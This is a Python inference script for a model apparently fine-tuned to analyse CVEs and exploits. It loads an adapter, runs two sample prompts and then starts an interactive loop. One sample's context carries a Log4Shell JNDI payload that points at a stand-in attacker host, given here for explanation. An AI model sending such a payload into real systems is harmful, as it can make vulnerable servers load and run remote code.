"""
inference_unsloth.py
--------------------
Fast inference using the Unsloth-fine-tuned model.
Loads adapter directly (no merge needed) — 2x faster inference mode.
"""

import yaml
from pathlib import Path
from model_loader_unsloth import load_for_inference

BASE = Path(__file__).resolve().parents[2]
with open(BASE / "configs" / "model_config.yaml") as f:
    mc = yaml.safe_load(f)

with open(BASE / "configs" / "training_config.yaml") as f:
    tc = yaml.safe_load(f)

ADAPTER_DIR  = tc["colab"]["output_dir"]
MAX_SEQ_LEN  = mc["tokenizer"]["max_length"]
MAX_NEW      = mc["inference"]["max_new_tokens"]
TEMPERATURE  = mc["inference"]["temperature"]
TOP_P        = mc["inference"]["top_p"]
REP_PENALTY  = mc["inference"]["repetition_penalty"]
DO_SAMPLE    = mc["inference"]["do_sample"]


def generate(model, tokenizer, instruction: str, context: str = "") -> str:
    user_content = f"{instruction}\n\n{context}" if context else instruction
    messages = [{"role": "user", "content": user_content}]
    prompt = tokenizer.apply_chat_template(
        messages, tokenize=False, add_generation_prompt=True
    )
    inputs = tokenizer(prompt, return_tensors="pt").to(model.device)
    outputs = model.generate(
        **inputs,
        max_new_tokens=MAX_NEW,
        do_sample=DO_SAMPLE,
        temperature=TEMPERATURE,
        top_p=TOP_P,
        repetition_penalty=REP_PENALTY,
        pad_token_id=tokenizer.eos_token_id,
    )
    generated = outputs[0][inputs["input_ids"].shape[1]:]
    return tokenizer.decode(generated, skip_special_tokens=True)


EXAMPLES = [
    {
        "instruction": "Analyze the following CVE and provide a structured vulnerability report.",
        "context": (
            "CVE ID: CVE-2024-1234\n"
            "Description: Heap buffer overflow in OpenSSL allows RCE via crafted TLS ClientHello.\n"
            "CVSS v3: 9.8 CRITICAL | Attack Vector: NETWORK | CWE: CWE-122"
        ),
    },
    {
        "instruction": "Explain this exploit, the vulnerability it targets, and its impact.",
        "context": (
            "Exploit Title: Apache Log4j RCE (Log4Shell)\n"
            "Platform: java | Type: remote\n"
            "Payload: ${jndi:ldap://attacker.com/exploit}"
        ),
    },
]


def main():
    model, tokenizer = load_for_inference(ADAPTER_DIR, MAX_SEQ_LEN)

    for i, ex in enumerate(EXAMPLES, 1):
        print(f"\n{'='*60}\nExample {i}\n{'='*60}")
        print(generate(model, tokenizer, ex["instruction"], ex.get("context", "")))

    print("\n--- Interactive Mode (type 'quit' to exit) ---\n")
    while True:
        instruction = input("Instruction: ").strip()
        if instruction.lower() in ("quit", "exit", "q"):
            break
        context = input("Context (Enter to skip): ").strip()
        print("\nResponse:")
        print(generate(model, tokenizer, instruction, context))
        print()


if __name__ == "__main__":
    main()
